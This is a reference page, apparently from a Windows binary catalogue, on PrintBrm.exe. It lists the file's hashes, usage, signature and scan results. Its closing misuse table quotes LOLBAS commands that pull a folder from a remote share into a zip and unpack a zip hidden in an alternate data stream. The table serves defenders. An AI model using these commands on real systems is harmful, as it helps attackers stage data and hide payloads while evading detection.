---
title: PrintBrm.exe | Print BRM command line tool
excerpt: What is PrintBrm.exe?
---

# PrintBrm.exe 

* File Path: `C:\WINDOWS\system32\spool\tools\PrintBrm.exe`
* Description: Print BRM command line tool

## Hashes

Type | Hash
-- | --
MD5 | `FDA40E92A1A8FC693BD5A8EBAB8088B8`
SHA1 | `812B9D1BF648DFC73B5E9E933B63B9B66A80E87E`
SHA256 | `DC41E345BD86205664B30491185602052699AF445263E9DA4F9F6838871EDDFA`
SHA384 | `9C70116B4869971B5C9282252EC02DADD06E15EB6DE068B45E7BF967B1BCDD088DA9876E6EE1022394321D708F8C7BAB`
SHA512 | `AB0B3C4B00C6CFB783D61600BB68BF454C19069EA783DF50461337D4577AE3F16A53B5A4AF0A04CE2FF6ADFEE6BFFC9603CE9B2940EA395E4BC4D56762BDDFF7`
SSDEEP | `384:SQvu1N3UnVRY3eAuOlJyqLZr6T0LZ9OACw/uw4DLRu7JRldpLY1HY1SLBj0XSaZE:lvu1/OsL72Evl4DLRU7s2SljgH7`
IMP | `335FB8BBF2AE039819821046E0DEAFCC`
PESHA1 | `2BF7EEE07F8D767E2F27B6ED6354302016C68979`
PE256 | `8A214C1DF52C2C54EA7001D3AD895B5B92045E57C3A34C0EA9E8ED645281C63C`

## Runtime Data

### Usage (stdout):
```cmhg
Error: A single mode must be selected!

Access the Backup Recovery Migration tool through a command line interface.

PrintBrm -B|R|Q [-S <server>] -F <file> [-D <directory>] [-O FORCE] [-P ALL|ORIG] [-NOBIN] [-LPR2TCP] [-C <config file>] [-NOACL] [-?]
-B               Backup the server to the specified file
-R               Restore the configuration in the file to the server
-Q               Query the server or the backup file
-S <server name> Target server
-F <file name>   Target backup File
-D <directory>   Unpack the backup file to (with -R) or repack a backup file from (with -B) the given directory
-O FORCE         Force overwriting of existing objects
-P ALL|ORIG      Publish all printers in directory, or publish printers that were published originally
-NOBIN           Omit the binaries from the backup
-LPR2TCP         Convert LPR ports to Standard TCP/IP ports on restore
-C <file name>   Use the specified configuration file for BRM
-NOACL           Remove ACLs from print queues on restore
-?               Display this help

```

### Loaded Modules:

Path |
-- |
C:\WINDOWS\System32\KERNEL32.DLL |
C:\WINDOWS\System32\KERNELBASE.dll |
C:\WINDOWS\SYSTEM32\ntdll.dll |
C:\WINDOWS\system32\spool\tools\PrintBrm.exe |


## Signature

* Status: Signature verified.
* Serial: `33000002ED2C45E4C145CF48440000000002ED`
* Thumbprint: `312860D2047EB81F8F58C29FF19ECDB4C634CF6A`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: PrintBrm.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.22000.1 (WinBuild.160101.0800)
* Product Version: 10.0.22000.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/74
* VirusTotal Link: https://www.virustotal.com/gui/file/dc41e345bd86205664b30491185602052699af445263e9da4f9f6838871eddfa/detection


## Possible Misuse

*The following table contains possible examples of `PrintBrm.exe` being misused. While `PrintBrm.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `Name: PrintBrm.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Command: PrintBrm -b -d \\1.2.3.4\share\example_folder -f C:\Users\user\Desktop\new.zip`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Command: PrintBrm -r -f C:\Users\user\Desktop\data.txt:hidden.zip -d C:\Users\user\Desktop\new_folder`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Path: C:\Windows\System32\spool\tools\PrintBrm.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- IOC: PrintBrm.exe should not be run on a normal workstation`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


